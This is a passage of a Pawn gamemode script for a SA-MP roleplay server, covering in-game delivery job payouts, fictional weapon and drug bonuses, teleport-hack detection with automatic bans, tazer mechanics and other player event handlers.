			{
			    if(!IsPlayerInRangeOfPoint(playerid, 6, -1552.82, 119.67, 3.55))
			    {// In the case the player finds a way to exploit the checkpoint to different location
                    CancelTruckDelivery(playerid);
                    SendClientMessage(playerid, COLOR_REALRED, "ERROR: Wrong checkpoint entered. Truck delivery canceled completely.");
					return 1;
			    }

			    new vehicleid = GetPlayerVehicleID(playerid);
   				if(!IsATruckerCar(vehicleid))
   				{// Patch for an exploit
   				    CancelTruckDelivery(playerid);
   				    SendClientMessage(playerid, COLOR_REALRED, "ERROR: You're not driving a Truck. Truck delivery canceled completely.");
   				    return 1;
   				}

 				if(GetPVarInt(playerid, "tpTruckRunTimer") != 0)
				{
  					new string[128];
					format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) is possibly teleport truckrunning.", GetPlayerNameEx(playerid), playerid);
  					ABroadCast(COLOR_YELLOW, string, 2);

  					format(string, sizeof(string), "%s was possibly teleport truckrunning.", GetPlayerNameEx(playerid));
  					AddAutomatedFlag(playerid, string);
    				// format(string, sizeof(string), "%s (ID %d) is possibly teleport truckrunning.", GetPlayerNameEx(playerid), playerid);
	    			// Log("logs/hack.log", string);
	    			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were paid $100 for delivering the goods and returning the truck.");
                    CancelTruckDelivery(playerid);

     				SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  					if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  					{
   						format(string, sizeof(string), "AdmCmd: %s has been banned, reason: Teleport hacking.", GetPlayerNameEx(playerid));
						SendClientMessageToAllEx(COLOR_LIGHTRED, string);
						PlayerInfo[playerid][pBanned] = 3;
						new playerip[32];
						GetPlayerIp(playerid, playerip, sizeof(playerip));
						format(string, sizeof(string), "AdmCmd: %s (IP:%s) was banned, reason: Teleport hacking.", GetPlayerNameEx(playerid), playerip);
						PlayerInfo[playerid][pBanned] = 3;
						Log("logs/ban.log", string);
   						new ip[32];
						GetPlayerIp(playerid,ip,sizeof(ip));
						AddBan(ip);
						Kick(playerid);
						TotalAutoBan++;
					}
	    			return 1;
				}

				if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	    		{
	        		SendClientMessage(playerid, COLOR_WHITE, "You're not in a Truck!");
	        		return 1;
	    		}
	    		if(TruckUsed[playerid] != INVALID_VEHICLE_ID && vehicleid != TruckUsed[playerid])
	    		{
	        		SendClientMessage(playerid, COLOR_WHITE, "This is not the Truck you used, return the Truck you used in order to receive your pay!");
	        		return 1;
	    		}

			    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
			    DisablePlayerCheckpoint(playerid);
			    gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;

			    SetVehicleToRespawn(vehicleid);

   				new string[128], payment;
				new level = PlayerInfo[playerid][pTruckSkill];
				if(level >= 0 && level < 50) payment = 100;
				else if(level >= 50 && level < 100) payment = 150;
				else if(level >= 100 && level < 200) payment = 300;
				else if(level >= 200 && level < 400) payment = 400;
				else if(level >= 400) payment = 500;

				GivePlayerCash(playerid, payment);
    			format(string, sizeof(string), "* You were paid $%d for delivering the goods and returning the truck.", payment);
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

                new truckdeliver = GetPVarInt(playerid, "TruckDeliver");
				/*if(truckdeliver == 11)
				{
				    if(PlayerInfo[playerid][pConnectTime] > 1)
				    {
   					 SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free 9mm as a bonus for taking the risk of transporting illegal weapons.");
			    		GivePlayerValidWeapon(playerid, 22, 60000);
					}
					else SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You did not receive a weapon bonus since your weapons are currently restricted.");
				}*/
			 	if(truckdeliver == 12)
				{
				    new randomweapon = Random(1, 3);
					if(PlayerInfo[playerid][pConnectTime] < 2)
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You did not receive a weapon bonus since your weapons are currently restricted.");
				    }
					else if(randomweapon == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free 9mm as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 22, 60000);
					}
					else if(randomweapon == 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free Silenced Pistol as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 23, 60000);
					}
				}
				else if(truckdeliver == 13)
				{
				    new randomweapon = Random(1, 4);
					if(PlayerInfo[playerid][pConnectTime] < 2)
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You did not receive a weapon bonus since your weapons are currently restricted.");
				    }
					else if(randomweapon == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free 9mm as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 22, 60000);
					}
					else if(randomweapon == 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free Silenced Pistol as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 23, 60000);
					}
					else if(randomweapon == 3)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free Shotgun as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 25, 60000);
					}
				}
				else if(truckdeliver == 14)
				{
				    new randomweapon = Random(1, 5);
					if(PlayerInfo[playerid][pConnectTime] < 2)
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You did not receive a weapon bonus since your weapons are currently restricted.");
				    }
					else if(randomweapon == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free 9mm as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 22, 60000);
					}
					else if(randomweapon == 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free Silenced Pistol as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 23, 60000);
					}
					else if(randomweapon == 3)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free Shotgun as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 25, 60000);
					}
					else if(randomweapon == 4)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free Country Rifle as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 33, 60000);
					}
				}
				else if(truckdeliver == 15)
				{
				    new randomweapon = Random(1, 101);
					if(PlayerInfo[playerid][pConnectTime] < 2)
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You did not receive a weapon bonus since your weapons are currently restricted.");
				    }
					else if(randomweapon >= 1 && randomweapon <= 45)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free Shotgun as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 25, 60000);
					}
					else if(randomweapon >= 46 && randomweapon <= 87)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free Country Rifle as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 33, 60000);
					}
					else if(randomweapon >= 88 && randomweapon <= 100)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given a free Deagle as a bonus for taking the risk of transporting illegal weapons.");
						GivePlayerValidWeapon(playerid, 24, 60000);
					}
				}
				/*else if(truckdeliver == 16)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 1 pot & 1 crack as a bonus for taking the risk of transporting illegal drugs.");
				    PlayerInfo[playerid][pPot] += 1;
				    PlayerInfo[playerid][pCrack] += 1;
				}*/
				else if(truckdeliver == 17)
				{
    				new drug = Random(1, 3);
					if(drug == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 1 pot as a bonus for taking the risk of transporting illegal drugs.");
						PlayerInfo[playerid][pPot] += 1;
					}
					else if(drug == 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 1 crack as a bonus for taking the risk of transporting illegal drugs.");
						PlayerInfo[playerid][pCrack] += 1;
					}
				}
				else if(truckdeliver == 18)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 1 pot & 1 crack as a bonus for taking the risk of transporting illegal drugs.");
				    PlayerInfo[playerid][pPot] += 1;
				    PlayerInfo[playerid][pCrack] += 1;
				}
				else if(truckdeliver == 19)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 2 pot & 2 crack as a bonus for taking the risk of transporting illegal drugs.");
				    PlayerInfo[playerid][pPot] += 2;
				    PlayerInfo[playerid][pCrack] += 2;
				}
				else if(truckdeliver == 20)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 3 pot & 3 crack as a bonus for taking the risk of transporting illegal drugs.");
				    PlayerInfo[playerid][pPot] += 3;
				    PlayerInfo[playerid][pCrack] += 3;
				}
				else if(truckdeliver == 21)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 25 materials as a bonus for taking the risk of transporting illegal materials.");
					PlayerInfo[playerid][pMats] += 25;
				}
				else if(truckdeliver == 22)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 50 materials as a bonus for taking the risk of transporting illegal materials.");
					PlayerInfo[playerid][pMats] += 50;
				}
				else if(truckdeliver == 23)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 100 materials as a bonus for taking the risk of transporting illegal materials.");
					PlayerInfo[playerid][pMats] += 100;
				}
				else if(truckdeliver == 24)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 150 materials as a bonus for taking the risk of transporting illegal materials.");
					PlayerInfo[playerid][pMats] += 150;
				}
				else if(truckdeliver == 25)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You were also given 200 materials as a bonus for taking the risk of transporting illegal materials.");
					PlayerInfo[playerid][pMats] += 200;
				}

				#if defined DOUBLE_EXP_ENABLED
					new hour,minuite,second;
					gettime(hour,minuite,second);
					if(DoubleEXPcheck(hour))
					{
				    	PlayerInfo[playerid][pTruckSkill] += 2;
				    	SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
					}
					else
					{
						SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
						PlayerInfo[playerid][pTruckSkill]++;
					}
				#else
					PlayerInfo[playerid][pTruckSkill]++;
				#endif

				TruckUsed[playerid] = INVALID_VEHICLE_ID;
				DeletePVar(playerid, "TruckDeliver");
			}
			case CHECKPOINT_HITMAN:
			{
			    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
			    DisablePlayerCheckpoint(playerid);
			    gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
			    SendClientMessage(playerid, COLOR_GRAD2, "  Type /enter to enter the HQ.");
			}
		}
	}

	for(new h = 0; h < MAX_POINTS; h++)
	{
		if(Points[h][Type] == 3 && GetPVarInt(playerid, "CrateDeliver") == 1 && IsPlayerInRangeOfPoint(playerid, 6.0, 2166.3772,-1675.3829,15.0859))
		{
			new string[128];
		    if(GetPVarInt(playerid, "tpDrugRunTimer") != 0) {
			   	format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) is possibly teleport drugrunning.", GetPlayerNameEx(playerid), playerid);
			   	ABroadCast(COLOR_YELLOW, string, 2);

			   	format(string, sizeof(string), "%s was possibly teleport drugrunning.", GetPlayerNameEx(playerid));
			   	AddAutomatedFlag(playerid, string);
			   	// format(string, sizeof(string), "%s (ID %d) is possibly teleport drugrunning.", GetPlayerNameEx(playerid), playerid);
			   	// Log("logs/hack.log", string);
			   	SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $150 for delivering the Drug Crates.");
   				DeletePVar(playerid, "CrateDeliver");
				PlayerInfo[playerid][pCrates] = 0;

				SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  				if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  				{
   					format(string, sizeof(string), "AdmCmd: %s has been banned, reason: Teleport hacking.", GetPlayerNameEx(playerid));
					SendClientMessageToAllEx(COLOR_LIGHTRED, string);
					PlayerInfo[playerid][pBanned] = 3;
					new playerip[32];
					GetPlayerIp(playerid, playerip, sizeof(playerip));
					format(string, sizeof(string), "AdmCmd: %s (IP:%s) was banned, reason: Teleport hacking.", GetPlayerNameEx(playerid), playerip);
					PlayerInfo[playerid][pBanned] = 3;
					Log("logs/ban.log", string);
   					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					AddBan(ip);
					Kick(playerid);
					TotalAutoBan++;
				}
			   	return 1;
			}
			DisablePlayerCheckpoint(playerid);
			new level = PlayerInfo[playerid][pSmugSkill];
   			if(level >= 0 && level < 50)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $250 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 250);
			}
			else if(level >= 50 && level < 100)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $300 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 300);
			}
			else if(level >= 100 && level < 200)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $350 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 350);
			}
			else if(level >= 200 && level < 400)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $400 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 400);
			}
			else if(level >= 400)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $450 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 450);
			}
			DeletePVar(playerid, "CrateDeliver");
			PlayerInfo[playerid][pCrates] = 0;
			Points[h][Stock] += 10;

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pSmugSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pSmugSkill]++;
				}
			#else
				PlayerInfo[playerid][pSmugSkill]++;
			#endif

			format(string, sizeof(string), " POT AVAILABLE: %d grams.", Points[h][Stock]);
			UpdateDynamic3DTextLabelText(Points[h][TextLabel], COLOR_YELLOW, string);
			return 1;
		}
		else if(Points[h][Type] == 4 && GetPVarInt(playerid, "CrateDeliver") == 2 && IsPlayerInRangeOfPoint(playerid, 6.0, 2354.2808,-1169.2959,28.0066))
		{
			new string[128];
		    if(GetPVarInt(playerid, "tpDrugRunTimer") != 0)
	    	{
			   	format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) is possibly teleport drugrunning.", GetPlayerNameEx(playerid), playerid);
			   	ABroadCast(COLOR_YELLOW, string, 2);

			   	format(string, sizeof(string), "%s was possibly teleport drugrunning.", GetPlayerNameEx(playerid));
			   	AddAutomatedFlag(playerid, string);
			   	// format(string, sizeof(string), "%s (ID %d) is possibly teleport drugrunning.", GetPlayerNameEx(playerid), playerid);
			   	// Log("logs/hack.log", string);
			   	SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $125 for delivering the Drug Crates.");
   				DeletePVar(playerid, "CrateDeliver");
				PlayerInfo[playerid][pCrates] = 0;

				SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  				if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  				{
   					format(string, sizeof(string), "AdmCmd: %s has been banned, reason: Teleport hacking.", GetPlayerNameEx(playerid));
					SendClientMessageToAllEx(COLOR_LIGHTRED, string);
					PlayerInfo[playerid][pBanned] = 3;
					new playerip[32];
					GetPlayerIp(playerid, playerip, sizeof(playerip));
					format(string, sizeof(string), "AdmCmd: %s (IP:%s) was banned, reason: Teleport hacking.", GetPlayerNameEx(playerid), playerip);
					PlayerInfo[playerid][pBanned] = 3;
					Log("logs/ban.log", string);
   					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					AddBan(ip);
					Kick(playerid);
					TotalAutoBan++;
				}
				return 1;
			}
			DisablePlayerCheckpoint(playerid);
			new level = PlayerInfo[playerid][pSmugSkill];

			if(level >= 0 && level < 50)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $250 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 250);
			}
			else if(level >= 50 && level < 100)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $300 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 300);
			}
			else if(level >= 100 && level < 200)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $350 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 350);
			}
			else if(level >= 200 && level < 400)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $400 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 400);
			}
			else if(level >= 400)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You received $450 for delivering the Drug Crates.");
				GivePlayerCash(playerid, 450);
			}
			DeletePVar(playerid, "CrateDeliver");
			PlayerInfo[playerid][pCrates] = 0;
			Points[h][Stock] += 10;

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pSmugSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pSmugSkill]++;
				}
			#else
				PlayerInfo[playerid][pSmugSkill]++;
			#endif

			format(string, sizeof(string), " CRACK AVAILABLE: %d grams.", Points[h][Stock]);
			UpdateDynamic3DTextLabelText(Points[h][TextLabel], COLOR_YELLOW, string);
			return 1;
		}
		else if(Points[h][Type] == 2 && GetPVarInt(playerid, "MatDeliver") == Points[h][MatPoint] && IsPlayerInRangeOfPoint(playerid, 6.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
		{
			if(GetPVarInt(playerid, "Packages") > 0)
			{
			    new
			        iOriginalMats = PlayerInfo[playerid][pMats];

				new string[128];
				if(GetPVarInt(playerid, "tpMatRunTimer") != 0)
			    {
			    	format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) is possibly teleport matrunning.", GetPlayerNameEx(playerid), playerid);
			    	ABroadCast(COLOR_YELLOW, string, 2);

			    	format(string, sizeof(string), "%s was possibly teleport matrunning.", GetPlayerNameEx(playerid));
			    	AddAutomatedFlag(playerid, string);
			    	// format(string, sizeof(string), "%s (ID %d) is possibly teleport matrunning.", GetPlayerNameEx(playerid), playerid);
			    	// Log("logs/hack.log", string);
			    	format(string, sizeof(string), "The factory gave you 250 materials for your delivery, on top of the %d materials you already have.", iOriginalMats);
			    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
   					DeletePVar(playerid, "Packages");
					DeletePVar(playerid, "MatDeliver");
					DisablePlayerCheckpoint(playerid);

					SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  					if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  					{
   						format(string, sizeof(string), "AdmCmd: %s has been banned, reason: Teleport hacking.", GetPlayerNameEx(playerid));
						SendClientMessageToAllEx(COLOR_LIGHTRED, string);
						PlayerInfo[playerid][pBanned] = 3;
						new playerip[32];
						GetPlayerIp(playerid, playerip, sizeof(playerip));
						format(string, sizeof(string), "AdmCmd: %s (IP:%s) was banned, reason: Teleport hacking.", GetPlayerNameEx(playerid), playerip);
						PlayerInfo[playerid][pBanned] = 3;
						Log("logs/ban.log", string);
   						new ip[32];
						GetPlayerIp(playerid,ip,sizeof(ip));
						AddBan(ip);
						Kick(playerid);
						TotalAutoBan++;
					}
			    	return 1;
				}
				new payout = (25)*(GetPVarInt(playerid, "Packages"));


				format(string, sizeof(string), "The factory gave you 250 materials for your delivery, on top of the %d materials you already have.", iOriginalMats);
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pMats] += 250;
				DeletePVar(playerid, "Packages");
				DeletePVar(playerid, "MatDeliver");
				DisablePlayerCheckpoint(playerid);
				for(new p = 0; p < sizeof(FamilyInfo); p++)
				{
					if(strcmp(Points[h][Owner], FamilyInfo[p][FamilyName], true) == 0)
					{
						FamilyInfo[p][FamilyBank] = FamilyInfo[p][FamilyBank]+(payout/3);
						//SendClientMessage(playerid, COLOR_WHITE, " Family owner recieved 33 percent of the cost.");
					}
				}
				return 1;
			}
		}
	}
	DisablePlayerCheckpoint(playerid);
	return 1;
}

forward ShowPlayerBeaconForCops(playerid);
public ShowPlayerBeaconForCops(playerid)
{
	foreach(Player, i)
	{
		if(IsACop(i))
		{
			SetPlayerMarkerForPlayer(i, playerid, COP_GREEN_COLOR);
		}
	}
	return 1;
}

forward HidePlayerBeaconForCops(playerid);
public HidePlayerBeaconForCops(playerid)
{
	foreach(Player, i)
	{
		if(IsACop(i))
		{
			SetPlayerMarkerForPlayer(i, playerid, TEAM_HIT_COLOR);
		}
	}
	SetPlayerToTeamColor(playerid);
	return 1;
}

forward ShowPlayerBeaconForMedics(playerid);
public ShowPlayerBeaconForMedics(playerid)
{
	foreach(Player, i)
	{
		if(IsInLSFMD(i))
		{
			SetPlayerMarkerForPlayer(i, playerid, COP_GREEN_COLOR);
		}
	}
	return 1;
}

forward HidePlayerBeaconForMedics(playerid);
public HidePlayerBeaconForMedics(playerid)
{
	foreach(Player, i)
	{
		if(IsInLSFMD(i))
		{
			SetPlayerMarkerForPlayer(i, playerid, TEAM_HIT_COLOR);
		}
	}
	SetPlayerToTeamColor(playerid);
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

public OnRconCommand(cmd[])
{
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	return 1;
}

public OnObjectMoved(objectid)
{
	return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid) {
	#if defined TREASURE_HUNT_ENABLED
	if(iHuntPickup == pickupid && GetPVarType(playerid, "fT") == 0 && AdminDuty[playerid] != 1) {
		new string[128];
		format(string, sizeof(string), "%s has just found a treasure package in the hunt.", GetPlayerNameEx(playerid));
		Log("logs/treasurehunt.log", string);
		format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) has just found a treasure package in the hunt.", GetPlayerNameEx(playerid), playerid);
		ABroadCast(COLOR_YELLOW, string, 5);
 		AskHuntQuestion(playerid);
 		SetPVarInt(playerid, "fT", 1);
	}
	#endif
	if(pickupid == dildo && PlayerInfo[playerid][pGuns][10] != 10 && PlayerInfo[playerid][pConnectTime] > 1) {
		GivePlayerValidWeapon(playerid, 10, 60000);
	}
	return 1;
}

public OnEnterExitModShop(playerid, enterexit, interiorid) {
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid) {
	if(!(1 <= GetPlayerInterior(playerid) <= 3) && PlayerInfo[playerid][pAdmin] < 5 && !GetPVarType(playerid, "unMod")) {

		new
			szMessage[128];

		format(szMessage, sizeof(szMessage), "AdmWarning: %s may be hacking vehicle modifications (applied %s %s to their %s).", GetPlayerNameEx(playerid), partName(componentid), partType(GetVehicleComponentType(componentid)), GetVehicleName(vehicleid));
		ABroadCast(COLOR_YELLOW, szMessage, 2);
	}

	if(GetPVarType(playerid, "unMod"))
		DeletePVar(playerid, "unMod");
	return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
	return 1;
}

forward TazerTimer(playerid);
public TazerTimer(playerid)
{
	if(TazerTimeout[playerid] > 0)
   	{
		new string[128];
   		format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~r~Tazer reloading... ~w~%d", TazerTimeout[playerid]);
		GameTextForPlayer(playerid, string,1500, 3);
		TazerTimeout[playerid] -= 1;
		SetTimerEx("TazerTimer",1000,false,"d",playerid);
   	}
	return 1;
}

Float:DistanceCameraTargetToLocation(Float:CamX, Float:CamY, Float:CamZ,  Float:ObjX, Float:ObjY, Float:ObjZ,  Float:FrX, Float:FrY, Float:FrZ)
{

    new Float:TGTDistance;

    // get distance from camera to target
    TGTDistance = floatsqroot((CamX - ObjX) * (CamX - ObjX) + (CamY - ObjY) * (CamY - ObjY) + (CamZ - ObjZ) * (CamZ - ObjZ));

    new Float:tmpX, Float:tmpY, Float:tmpZ;

    tmpX = FrX * TGTDistance + CamX;
    tmpY = FrY * TGTDistance + CamY;
    tmpZ = FrZ * TGTDistance + CamZ;

    return floatsqroot((tmpX - ObjX) * (tmpX - ObjX) + (tmpY - ObjY) * (tmpY - ObjY) + (tmpZ - ObjZ) * (tmpZ - ObjZ));
}

stock IsPlayerAimingAt(playerid, Float:x, Float:y, Float:z, Float:radius)
{
    new Float:cx,Float:cy,Float:cz,Float:fx,Float:fy,Float:fz;
    GetPlayerCameraPos(playerid, cx, cy, cz);
    GetPlayerCameraFrontVector(playerid, fx, fy, fz);
    return (radius >= DistanceCameraTargetToLocation(cx, cy, cz, x, y, z, fx, fy, fz));
}

public OnPlayerInteriorChange(playerid,newinteriorid,oldinteriorid)
{
	PlayerInfo[playerid][pInt] = newinteriorid;

	if(GettingSpectated[playerid] != 999)
	{
	    new spectator = GettingSpectated[playerid];
	    if(!IsPlayerConnected(spectator))
	    {
	        GettingSpectated[playerid] = 999;
	        Spectate[spectator] = 999;
		}
		else
		{
			PlayerSpectatePlayer(spectator, playerid);
			SetPlayerInterior(spectator, GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(spectator, GetPlayerVirtualWorld(playerid));
		}
	}
	Streamer_Update(playerid);
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid) {
	if(GetPVarInt(playerid, "UsingSprunk") && amount > 4) {
		new
			szMessage[128];

		DeletePVar(playerid, "UsingSprunk");
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		format(szMessage, sizeof(szMessage), "* %s drops their sprunk onto the floor.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}

	return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid) {
	if(pTazer[playerid] == 1 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && weaponid == 23 && amount > 10) {
 		if(TazerTimeout[playerid] > 0) return 1;
		if(PlayerCuffed[damagedid] == 0 && GetPlayerState(damagedid) == PLAYER_STATE_ONFOOT && (GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(damagedid))) {
		    new
				Float:X,
				Float:Y,
				Float:Z,
				string[44 + (MAX_PLAYER_NAME * 2)];
		    GetPlayerPos(playerid, X, Y, Z);

			if(!IsPlayerInRangeOfPoint(damagedid, 18.5, X, Y, Z))
				return SendClientMessage(playerid, COLOR_GRAD2, "Your tazer can't reach that far!");

			if(AdminDuty[damagedid] == 1)
				return SendClientMessage(playerid, COLOR_GRAD2, "Admins can't be tazed!");

			if(GetPVarInt(damagedid, "Injured") == 1)
				return SendClientMessage(playerid, COLOR_GREY, "You can't taze injured people.");

 			format(string, sizeof(string), "* %s fires their tazer at %s, stunning them.", GetPlayerNameEx(playerid), GetPlayerNameEx(damagedid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			GameTextForPlayer(damagedid, "~r~Tazed", 3500, 3);
			TogglePlayerControllable(damagedid, 0);
			ApplyAnimation(damagedid,"CRACK","crckdeth2",4.1,0,1,1,1,1,1);
   			GetPlayerPos(damagedid, X, Y, Z);
			PlayerPlaySound(damagedid, 1085, X, Y, Z);
			PlayerPlaySound(playerid, 1085, X, Y, Z);
			PlayerCuffed[damagedid] = 1;
			SetPVarInt(damagedid, "PlayerCuffed", 1);
			PlayerCuffedTime[damagedid] = 16;
			SetPVarInt(damagedid, "IsFrozen", 1);
			TazerTimeout[playerid] = 4;
			SetTimerEx("TazerTimer",1000,false,"d",playerid);
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~r~Tazer reloading... ~w~5", 1500,3);
			return 1;
		}
	}
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys) {
    if(IsPlayerNPC(playerid))
		return 1;

	if (((newkeys & KEY_WALK && newkeys & KEY_UP) || (newkeys & KEY_WALK && newkeys & KEY_DOWN) || (newkeys & KEY_WALK && newkeys & KEY_LEFT) || (newkeys & KEY_WALK && newkeys & KEY_RIGHT))
